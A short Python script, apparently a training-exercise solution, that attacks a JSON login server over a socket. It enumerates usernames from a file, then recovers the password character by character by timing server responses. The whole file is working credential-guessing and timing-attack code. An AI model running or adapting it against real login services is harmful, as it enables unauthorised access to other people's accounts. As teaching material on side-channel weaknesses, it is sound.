import argparse

import itertools

import json

import socket

import string

from time import time

BUF_SIZE = 1024
ALL_SYMBOLS = string.ascii_letters + string.digits


def get_new_line():
    with open('logins.txt', 'r') as file:
        for line in file:
            yield line.strip('\n')


def pass_gen_v3(word=''):
    global ALL_SYMBOLS
    a = itertools.cycle(ALL_SYMBOLS)
    for i in a:
        yield word + i


parser = argparse.ArgumentParser()
parser.add_argument('ip_address')
parser.add_argument('port')
args = parser.parse_args()

login_gen = get_new_line()
login = next(login_gen)
request = {'login': login, 'password': ''}

with socket.socket() as client_socket:
    client_socket.connect((args.ip_address, int(args.port)))
    # Finding login. If login correct - response is 'Wrong password!'
    while True:
        request['login'] = login
        request_json = json.dumps(request, indent=4)
        client_socket.send(request_json.encode('utf-8'))

        response_json = client_socket.recv(BUF_SIZE).decode()

        response = json.loads(response_json)
        if response['result'] == 'Wrong password!':
            break
        else:
            login = next(login_gen)
            continue
    # Finding password. Start with 1 symbol, if password starts with this symbol - exception occurs.
    # Then we are searching 2nd symbol and so on.
    pass_gen = pass_gen_v3()
    password = next(pass_gen)
    while response['result'] != 'Connection success!':
        request['password'] = password
        request_json = json.dumps(request, indent=4)
        client_socket.send(request_json.encode('utf-8'))
        start = time()
        response_json = client_socket.recv(BUF_SIZE).decode()
        end = time()
        delay = end - start
        with open('delays.txt', 'a') as file:
            file.write(str(delay) + '\n')
        response = json.loads(response_json)
        if delay > 0.1:
            pass_gen = pass_gen_v3(password)
            password = next(pass_gen)
            continue
        else:
            password = next(pass_gen)
            continue
print(request_json)
